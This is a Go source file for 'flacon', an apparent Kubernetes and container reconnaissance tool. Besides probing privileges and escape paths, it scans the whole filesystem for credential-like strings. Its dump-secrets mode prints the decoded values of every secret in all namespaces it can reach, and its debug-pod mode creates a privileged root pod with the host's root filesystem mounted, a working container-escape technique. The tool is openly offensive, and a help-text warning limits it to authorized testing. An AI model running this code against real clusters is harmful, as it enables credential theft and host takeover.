package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"gopkg.in/yaml.v3"

	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"

	"github.com/a1ex-var1amov/flacon/version"
)

type ReconData struct {
	IsContainer         bool              `json:"is_container" yaml:"is_container"`
	Privileged          bool              `json:"privileged" yaml:"privileged"`
	Secrets             []string          `json:"secrets" yaml:"secrets"`
	SecretsFound        []string          `json:"secrets_found" yaml:"secrets_found"`
	SecretsInCluster    []string          `json:"k8s_secrets" yaml:"k8s_secrets"`
	ConfigMapsInCluster []string          `json:"k8s_configmaps" yaml:"k8s_configmaps"`
	CanCreatePod        bool              `json:"can_create_pod" yaml:"can_create_pod"`
	Misconfigs          []string          `json:"misconfigs" yaml:"misconfigs"`
	EscapePaths         []string          `json:"escape_paths" yaml:"escape_paths"`
	WritablePaths       []string          `json:"writable_paths" yaml:"writable_paths"`
	PlatformInfo        map[string]string `json:"platform_info" yaml:"platform_info"`
	BaseImage           string            `json:"base_image" yaml:"base_image"`
	EBPF                bool              `json:"ebpf_supported" yaml:"ebpf_supported"`
	CloneSyscall        bool              `json:"clone_syscall_allowed" yaml:"clone_syscall_allowed"`
}

func main() {
	// Check for version command
	if len(os.Args) > 1 {
		switch os.Args[1] {
		case "version", "-v", "--version":
			fmt.Println(version.FullString())
			return
		case "help", "-h", "--help":
			printUsage()
			return
		case "quick", "--quick":
			// Quick scan mode - skip filesystem scanning
			runQuickScan()
			return
		case "dump-secrets", "--dump-secrets":
			// Dump secrets from all accessible namespaces
			dumpAllSecrets()
			return
		case "debug-pod", "--debug-pod":
			// Create a privileged debug pod
			createDebugPod()
			return
		}
	}

	format := "yaml" // change to "json" if needed
	var recon ReconData

	fmt.Println("🔍 Starting flacon reconnaissance...")
	fmt.Println("📋 Version:", version.String())

	fmt.Println("🔍 Checking container environment...")
	recon.IsContainer = isContainer()
	if recon.IsContainer {
		fmt.Println("✅ Running in container")
	} else {
		fmt.Println("ℹ️  Running on host system")
	}

	fmt.Println("🔍 Detecting platform...")
	recon.PlatformInfo = detectPlatform()
	recon.BaseImage = detectBaseImage()

	fmt.Println("🔍 Checking privileges...")
	recon.Privileged = checkPrivileged()
	if recon.Privileged {
		fmt.Println("⚠️  Running with privileged access")
	} else {
		fmt.Println("✅ Running with normal privileges")
	}

	fmt.Println("🔍 Checking for secrets in common locations...")
	recon.Secrets = checkSecrets()

	fmt.Println("🔍 Scanning for secrets in filesystem (this may take a while)...")
	recon.SecretsFound = scanSecrets("/")

	fmt.Println("🔍 Checking for misconfigurations...")
	recon.Misconfigs = checkMisconfigs()

	fmt.Println("🔍 Checking escape paths...")
	recon.EscapePaths = checkEscapePaths()

	fmt.Println("🔍 Checking writable paths...")
	recon.WritablePaths = checkWritablePaths([]string{"/", "/etc", "/var", "/host", "/mnt", "/app", "/data"})

	fmt.Println("🔍 Checking eBPF support...")
	recon.EBPF = checkEBPFSupport()

	fmt.Println("🔍 Checking clone syscall...")
	recon.CloneSyscall = checkCloneSyscall()

	fmt.Println("🔍 Checking Kubernetes access...")
	recon.SecretsInCluster, recon.ConfigMapsInCluster = listK8sSecretsAndConfigMaps()
	recon.CanCreatePod = checkPodCreationRights()

	fmt.Println("📊 Generating reconnaissance report...")
	outputRecon(recon, format)
}

func runQuickScan() {
	fmt.Println("🔍 Starting flacon quick reconnaissance...")
	fmt.Println("📋 Version:", version.String())
	fmt.Println("⚡ Quick mode - skipping filesystem scanning")

	format := "yaml"
	var recon ReconData

	fmt.Println("🔍 Checking container environment...")
	recon.IsContainer = isContainer()
	if recon.IsContainer {
		fmt.Println("✅ Running in container")
	} else {
		fmt.Println("ℹ️  Running on host system")
	}

	fmt.Println("🔍 Detecting platform...")
	recon.PlatformInfo = detectPlatform()
	recon.BaseImage = detectBaseImage()

	fmt.Println("🔍 Checking privileges...")
	recon.Privileged = checkPrivileged()
	if recon.Privileged {
		fmt.Println("⚠️  Running with privileged access")
	} else {
		fmt.Println("✅ Running with normal privileges")
	}

	fmt.Println("🔍 Checking for secrets in common locations...")
	recon.Secrets = checkSecrets()

	fmt.Println("🔍 Skipping filesystem scan (quick mode)...")
	recon.SecretsFound = []string{}

	fmt.Println("🔍 Checking for misconfigurations...")
	recon.Misconfigs = checkMisconfigs()

	fmt.Println("🔍 Checking escape paths...")
	recon.EscapePaths = checkEscapePaths()

	fmt.Println("🔍 Checking writable paths...")
	recon.WritablePaths = checkWritablePaths([]string{"/", "/etc", "/var", "/host", "/mnt", "/app", "/data"})

	fmt.Println("🔍 Checking eBPF support...")
	recon.EBPF = checkEBPFSupport()

	fmt.Println("🔍 Checking clone syscall...")
	recon.CloneSyscall = checkCloneSyscall()

	fmt.Println("🔍 Checking Kubernetes access...")
	recon.SecretsInCluster, recon.ConfigMapsInCluster = listK8sSecretsAndConfigMaps()
	recon.CanCreatePod = checkPodCreationRights()

	fmt.Println("📊 Generating reconnaissance report...")
	outputRecon(recon, format)
}

func printUsage() {
	fmt.Printf(`%s

Usage: flacon [command]

Commands:
  version, -v, --version    Show version information
  help, -h, --help         Show this help message
  quick, --quick           Run quick reconnaissance (skip filesystem scan)
  dump-secrets, --dump-secrets  Dump secrets from all accessible namespaces
  debug-pod, --debug-pod   Create a privileged debug pod
  (no args)                Run full Kubernetes reconnaissance

Examples:
  flacon                   Run full reconnaissance and output YAML
  flacon quick             Run quick reconnaissance (faster)
  flacon dump-secrets      Dump all secrets from all namespaces
  flacon debug-pod         Create a privileged debug pod
  flacon version           Show version information
  flacon --help            Show help message

Note: Full reconnaissance includes filesystem scanning which can be slow on large systems.
Use 'quick' mode for faster results without filesystem scanning.

WARNING: dump-secrets and debug-pod commands require appropriate Kubernetes permissions
and should only be used for authorized security testing.

`, version.String())
}

// --- Helper Functions Below ---

func isContainer() bool {
	if cgroup, err := ioutil.ReadFile("/proc/1/cgroup"); err == nil && strings.Contains(string(cgroup), "docker") {
		return true
	}
	if _, err := os.Stat("/.dockerenv"); err == nil {
		return true
	}
	return false
}

func detectPlatform() map[string]string {
	info := make(map[string]string)
	if content, err := ioutil.ReadFile("/proc/version"); err == nil {
		info["kernel_version"] = strings.TrimSpace(string(content))
	}
	if content, err := ioutil.ReadFile("/etc/os-release"); err == nil {
		lines := strings.Split(string(content), "\n")
		for _, line := range lines {
			if strings.HasPrefix(line, "PRETTY_NAME=") {
				info["os"] = strings.Trim(line[len("PRETTY_NAME="):], "\"")
			}
		}
	}

	// Use runtime.GOARCH instead of unix.Uname for better cross-compilation support
	info["architecture"] = runtime.GOARCH

	return info
}

func detectBaseImage() string {
	paths := []string{"/etc/os-release", "/etc/alpine-release", "/etc/issue", "/etc/redhat-release"}
	for _, path := range paths {
		content, err := ioutil.ReadFile(path)
		if err == nil && len(content) > 0 {
			return fmt.Sprintf("Info from %s: %s", path, strings.TrimSpace(string(content)))
		}
	}
	if _, err := exec.LookPath("apk"); err == nil {
		return "Alpine (apk detected)"
	}
	if _, err := exec.LookPath("apt"); err == nil {
		return "Debian/Ubuntu (apt detected)"
	}
	if _, err := exec.LookPath("yum"); err == nil {
		return "RHEL/CentOS (yum detected)"
	}
	if _, err := exec.LookPath("dnf"); err == nil {
		return "Fedora/RHEL (dnf detected)"
	}
	return "Unknown base image"
}

func checkPrivileged() bool {
	if _, err := os.Stat("/dev/kmsg"); err == nil {
		return true
	}
	return false
}

func checkSecrets() []string {
	paths := []string{
		"/var/run/secrets/kubernetes.io/serviceaccount",
		"/var/run/secrets/",
		"/etc/secrets/",
	}
	found := []string{}
	for _, p := range paths {
		files, err := ioutil.ReadDir(p)
		if err == nil {
			for _, f := range files {
				found = append(found, filepath.Join(p, f.Name()))
			}
		}
	}
	return found
}

func scanSecrets(root string) []string {
	var found []string
	var fileCount int
	var processedCount int

	// Skip common directories that are usually not interesting
	skipDirs := map[string]bool{
		"/proc":      true,
		"/sys":       true,
		"/dev":       true,
		"/run":       true,
		"/tmp":       true,
		"/var/tmp":   true,
		"/var/cache": true,
		"/var/log":   true,
	}

	// First, count files to show progress
	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}

		// Skip directories we don't want to scan
		if info.IsDir() {
			if skipDirs[path] {
				return filepath.SkipDir
			}
			return nil
		}

		// Only count files under 5MB
		if info.Size() <= 5*1024*1024 {
			fileCount++
		}
		return nil
	})

	if fileCount == 0 {
		fmt.Println("   ℹ️  No files to scan")
		return found
	}

	fmt.Printf("   📁 Found %d files to scan\n", fileCount)

	// Now scan the files
	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}

		// Skip directories we don't want to scan
		if info.IsDir() {
			if skipDirs[path] {
				return filepath.SkipDir
			}
			return nil
		}

		// Skip files larger than 5MB
		if info.Size() > 5*1024*1024 {
			return nil
		}

		processedCount++
		if processedCount%1000 == 0 {
			fmt.Printf("   📊 Progress: %d/%d files scanned (%.1f%%)\n", processedCount, fileCount, float64(processedCount)/float64(fileCount)*100)
		}

		content, err := ioutil.ReadFile(path)
		if err != nil {
			return nil
		}

		data := string(content)
		if strings.Contains(data, "Bearer ") || strings.Contains(data, "eyJ") || strings.Contains(data, "AKIA") || strings.Contains(data, "-----BEGIN") || strings.Contains(data, "access_token") || strings.Contains(data, "secret") {
			found = append(found, path)
			fmt.Printf("   🔐 Found potential secret in: %s\n", path)
		}

		return nil
	})

	fmt.Printf("   ✅ Scan complete: %d files processed, %d potential secrets found\n", processedCount, len(found))
	return found
}

func checkMisconfigs() []string {
	misconfigs := []string{}
	if _, err := os.Stat("/var/run/docker.sock"); err == nil {
		misconfigs = append(misconfigs, "Docker socket mounted")
	}
	if os.Getenv("KUBERNETES_SERVICE_HOST") != "" {
		misconfigs = append(misconfigs, "Kubernetes env variable set")
	}
	return misconfigs
}

func checkEscapePaths() []string {
	escapes := []string{}
	if _, err := os.Stat("/proc/kcore"); err == nil {
		escapes = append(escapes, "/proc/kcore present")
	}
	return escapes
}

func checkWritablePaths(paths []string) []string {
	writable := []string{}
	for _, path := range paths {
		testFile := filepath.Join(path, ".write_test")
		err := ioutil.WriteFile(testFile, []byte("test"), 0644)
		if err == nil {
			writable = append(writable, path)
			os.Remove(testFile)
		}
	}
	return writable
}

func checkEBPFSupport() bool {
	_, err := os.Open("/sys/fs/bpf")
	return err == nil
}

func checkCloneSyscall() bool {
	// There is no unix.Fork in Go; as a placeholder, return false.
	return false
}

func outputRecon(data ReconData, format string) {
	switch format {
	case "json":
		out, _ := json.MarshalIndent(data, "", "  ")
		fmt.Println(string(out))
	case "yaml":
		out, _ := yaml.Marshal(&data)
		fmt.Println(string(out))
	default:
		fmt.Println("Unsupported format")
	}
}

func listK8sSecretsAndConfigMaps() ([]string, []string) {
	config, err := rest.InClusterConfig()
	if err != nil {
		return nil, nil
	}
	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return nil, nil
	}

	namespace := os.Getenv("POD_NAMESPACE")
	if namespace == "" {
		namespace = "default"
	}

	secretsList, err := clientset.CoreV1().Secrets(namespace).List(context.TODO(), metav1.ListOptions{})
	if err != nil {
		return nil, nil
	}
	configMapsList, err := clientset.CoreV1().ConfigMaps(namespace).List(context.TODO(), metav1.ListOptions{})
	if err != nil {
		return nil, nil
	}

	secrets := []string{}
	for _, s := range secretsList.Items {
		secrets = append(secrets, s.Name)
	}

	configmaps := []string{}
	for _, c := range configMapsList.Items {
		configmaps = append(configmaps, c.Name)
	}

	return secrets, configmaps
}

func checkPodCreationRights() bool {
	fmt.Println("   🔍 Testing pod creation permissions...")

	config, err := rest.InClusterConfig()
	if err != nil {
		fmt.Println("   ❌ Failed to get in-cluster config:", err)
		return false
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		fmt.Println("   ❌ Failed to create clientset:", err)
		return false
	}

	// Get current namespace
	namespace := os.Getenv("POD_NAMESPACE")
	if namespace == "" {
		// Try to read from service account namespace file
		if nsBytes, err := ioutil.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace"); err == nil {
			namespace = strings.TrimSpace(string(nsBytes))
		} else {
			namespace = "default"
		}
	}
	fmt.Printf("   📍 Testing in namespace: %s\n", namespace)

	// Try to create a dummy pod (dry-run) using the proper API
	dummyPod := &corev1.Pod{
		TypeMeta: metav1.TypeMeta{
			Kind:       "Pod",
			APIVersion: "v1",
		},
		ObjectMeta: metav1.ObjectMeta{
			Name:      "recon-dummy",
			Namespace: namespace,
		},
		Spec: corev1.PodSpec{
			Containers: []corev1.Container{
				{
					Name:    "test",
					Image:   "busybox:latest",
					Command: []string{"sleep", "1"},
				},
			},
			RestartPolicy: corev1.RestartPolicyNever,
		},
	}

	// Use the proper API call with dry-run
	_, err = clientset.CoreV1().Pods(namespace).Create(context.TODO(), dummyPod, metav1.CreateOptions{
		DryRun: []string{"All"},
	})

	if err != nil {
		fmt.Printf("   ❌ Pod creation test failed: %v\n", err)
		return false
	}

	fmt.Println("   ✅ Pod creation permissions confirmed")
	return true
}

func dumpAllSecrets() {
	fmt.Println("🔍 Starting secrets dump from all accessible namespaces...")
	fmt.Println("📋 Version:", version.String())

	config, err := rest.InClusterConfig()
	if err != nil {
		fmt.Printf("❌ Failed to get in-cluster config: %v\n", err)
		return
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		fmt.Printf("❌ Failed to create clientset: %v\n", err)
		return
	}

	// Get all namespaces
	namespaces, err := clientset.CoreV1().Namespaces().List(context.TODO(), metav1.ListOptions{})
	if err != nil {
		fmt.Printf("❌ Failed to list namespaces: %v\n", err)
		return
	}

	fmt.Printf("📁 Found %d accessible namespaces\n", len(namespaces.Items))

	totalSecrets := 0
	for _, ns := range namespaces.Items {
		namespace := ns.Name
		fmt.Printf("\n🔍 Scanning namespace: %s\n", namespace)

		secrets, err := clientset.CoreV1().Secrets(namespace).List(context.TODO(), metav1.ListOptions{})
		if err != nil {
			fmt.Printf("   ❌ Failed to list secrets in %s: %v\n", namespace, err)
			continue
		}

		fmt.Printf("   📦 Found %d secrets\n", len(secrets.Items))

		for _, secret := range secrets.Items {
			totalSecrets++
			fmt.Printf("   🔐 Secret: %s (Type: %s)\n", secret.Name, secret.Type)

			// Dump secret data (base64 encoded)
			for key, value := range secret.Data {
				fmt.Printf("      Key: %s, Value: %s\n", key, string(value))
			}
		}
	}

	fmt.Printf("\n✅ Secrets dump complete: %d total secrets found\n", totalSecrets)
}

func createDebugPod() {
	fmt.Println("🔍 Creating privileged debug pod...")
	fmt.Println("📋 Version:", version.String())

	config, err := rest.InClusterConfig()
	if err != nil {
		fmt.Printf("❌ Failed to get in-cluster config: %v\n", err)
		return
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		fmt.Printf("❌ Failed to create clientset: %v\n", err)
		return
	}

	// Get current namespace
	namespace := os.Getenv("POD_NAMESPACE")
	if namespace == "" {
		if nsBytes, err := ioutil.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace"); err == nil {
			namespace = strings.TrimSpace(string(nsBytes))
		} else {
			namespace = "default"
		}
	}

	fmt.Printf("📍 Creating debug pod in namespace: %s\n", namespace)

	// Create a privileged debug pod
	debugPod := &corev1.Pod{
		TypeMeta: metav1.TypeMeta{
			Kind:       "Pod",
			APIVersion: "v1",
		},
		ObjectMeta: metav1.ObjectMeta{
			Name:      "flacon-debug-pod",
			Namespace: namespace,
			Labels: map[string]string{
				"app": "flacon-debug",
			},
		},
		Spec: corev1.PodSpec{
			Containers: []corev1.Container{
				{
					Name:    "debug",
					Image:   "busybox:latest",
					Command: []string{"sleep", "3600"},
					SecurityContext: &corev1.SecurityContext{
						Privileged: &[]bool{true}[0],
						RunAsUser:  &[]int64{0}[0],
					},
					VolumeMounts: []corev1.VolumeMount{
						{
							Name:      "host-root",
							MountPath: "/host",
						},
					},
				},
			},
			Volumes: []corev1.Volume{
				{
					Name: "host-root",
					VolumeSource: corev1.VolumeSource{
						HostPath: &corev1.HostPathVolumeSource{
							Path: "/",
						},
					},
				},
			},
			RestartPolicy: corev1.RestartPolicyNever,
		},
	}

	// Create the pod
	createdPod, err := clientset.CoreV1().Pods(namespace).Create(context.TODO(), debugPod, metav1.CreateOptions{})
	if err != nil {
		fmt.Printf("❌ Failed to create debug pod: %v\n", err)
		return
	}

	fmt.Printf("✅ Debug pod created successfully!\n")
	fmt.Printf("   Name: %s\n", createdPod.Name)
	fmt.Printf("   Namespace: %s\n", createdPod.Namespace)
	fmt.Printf("   Status: %s\n", createdPod.Status.Phase)

	// Wait for pod to be ready
	fmt.Println("⏳ Waiting for pod to be ready...")
	for i := 0; i < 30; i++ {
		pod, err := clientset.CoreV1().Pods(namespace).Get(context.TODO(), createdPod.Name, metav1.GetOptions{})
		if err != nil {
			fmt.Printf("❌ Failed to get pod status: %v\n", err)
			return
		}

		if pod.Status.Phase == corev1.PodRunning {
			fmt.Println("✅ Debug pod is running!")
			fmt.Printf("   To access the pod: kubectl exec -it %s -n %s -- /bin/sh\n", createdPod.Name, namespace)
			fmt.Printf("   To delete the pod: kubectl delete pod %s -n %s\n", createdPod.Name, namespace)
			return
		}

		fmt.Printf("   Status: %s\n", pod.Status.Phase)
		time.Sleep(2 * time.Second)
	}

	fmt.Println("⚠️  Pod creation timed out, but pod may still be starting")
}
